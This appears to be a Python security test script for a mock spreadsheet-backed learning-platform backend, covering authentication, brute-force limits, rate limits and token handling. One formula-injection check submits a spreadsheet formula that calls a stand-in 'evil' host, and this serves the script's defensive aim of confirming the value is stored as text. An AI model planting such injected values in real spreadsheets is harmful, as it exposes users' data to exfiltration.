import json, urllib.request
import os
U=os.environ.get("MOCK_URL","http://127.0.0.1:8850/")
def raw(d):
    b=d if isinstance(d,(bytes,str)) else json.dumps(d)
    return json.loads(urllib.request.urlopen(urllib.request.Request(U+"raw", data=b.encode() if isinstance(b,str) else b, method="POST")).read())
def get(p): return json.loads(urllib.request.urlopen(U+p).read())
res={}
prof=lambda e,g:{"action":"register","email":e,"givenName":g,"lastName":"X","name":g+" X","age":30,"role":"Teacher","gradeLevels":["Grade 10"],"school":"S","privacyConsent":True}
a=raw(prof("alice@example.com","Alice")); res["register returns token"]=bool(a.get("token"))
b=raw(prof("bob@example.com","Bob"))
r=raw(prof("alice@example.com","=HACKED")); res["re-register existing email blocked"]=r.get("error")=="exists"
d=get("dump"); res["profile not overwritten"]=any(row[1]=="Alice" for row in d["Learners"][1:])
r=raw({"action":"lookup","email":"alice@example.com"}); res["lookup leaks no profile/progress"]= "profile" not in r and "progress" not in r and r.get("codeSent")==True
r=raw({"action":"event","email":"alice@example.com","events":[{"moduleId":"1.1","itemId":"x","type":"section_done"}]}); res["action without token rejected"]=r.get("error")=="auth_required"
r=raw({"action":"event","email":"alice@example.com","token":b["token"],"events":[{"ts":1,"moduleId":"1.1","itemId":"forged","type":"section_done","value":"1"}]})
d=get("dump")
prog={row[0]:row[2] for row in d["Progress"][1:]}
res["forged email ignored (write goes to token owner)"]= "forged" in prog.get("bob@example.com","") and "forged" not in prog.get("alice@example.com","")
r=raw({"action":"event","token":"x"*64,"events":[]}); res["fake token rejected"]=r.get("error")=="auth_required"
# code brute force
raw({"action":"lookup","email":"bob@example.com"}); out=[raw({"action":"verify","email":"bob@example.com","code":"000000"}).get("error") for i in range(6)]
res["code brute force stops after 5 tries"]= out[:5]==["bad_code"]*5 and out[5]=="code_expired"
# correct code flow
raw({"action":"lookup","email":"bob@example.com"}); c=get("lastcode")
v=raw({"action":"verify","email":"bob@example.com","code":c["code"]}); res["correct code signs in"]=bool(v.get("token")) and v["profile"]["givenName"]=="Bob"
res["code is single-use"]=raw({"action":"verify","email":"bob@example.com","code":c["code"]}).get("error")=="code_expired"
res["3 codes per hour per email"]=[raw({"action":"lookup","email":"alice@example.com"}).get("error") for i in range(4)][-1] in ("too_many_codes","rate_limited")
# formula injection
f=raw(prof("eve@example.com","=IMPORTXML(\"http://evil\",\"//a\")")); d=get("dump")
eve=[row for row in d["Learners"] if row[0]=="eve@example.com"][0]; res["formula stored as text"]=str(eve[1]).startswith("'=")
res["email starting with = rejected"]=raw(prof("=1+1@example.com","Z")).get("error")=="invalid_email"
# rate limit
out=[raw({"action":"heartbeat","token":v["token"],"minutes":1}).get("error") for i in range(125)]; res["per-learner rate limit (120/min)"]="rate_limited" in out
# payload
res["oversized payload rejected"]=raw({"action":"feedback","token":a["token"],"comment":"x"*400000}).get("error")=="too_large"
# admin
res["adminData without token refused"]=raw({"action":"adminData"}).get("error")=="expired"
res["adminData with learner token refused"]=raw({"action":"adminData","token":a["token"]}).get("error")=="expired"
out=[raw({"action":"adminLogin","email":"e%d@example.com"%i,"pin":"0"}).get("error") for i in range(32)]; res["global admin brute-force lock"]=out[-1]=="locked"
# logout revokes
raw({"action":"logout","token":a["token"]}); res["logout revokes token"]=raw({"action":"heartbeat","token":a["token"],"minutes":1}).get("error")=="auth_required"
# client errors
raw({"action":"clientError","token":f["token"],"errors":[{"where":"#/m/1.1","message":"TypeError x"}]}); d=get("dump")
res["client errors logged"]=any(row[1]=="client" for row in d["Errors"][1:]); res["security events logged"]=any(row[1]=="security" for row in d["Errors"][1:])
res["tokens stored hashed"]=all(len(str(row[0]))==64 and row[0]!=a["token"] for row in d["Sessions"][1:] if not str(row[0]).startswith("revoked"))
for k,val in res.items(): print(("PASS " if val else "FAIL ")+k)
print(sum(res.values()),"/",len(res))
import sys
sys.exit(0 if all(res.values()) else 1)
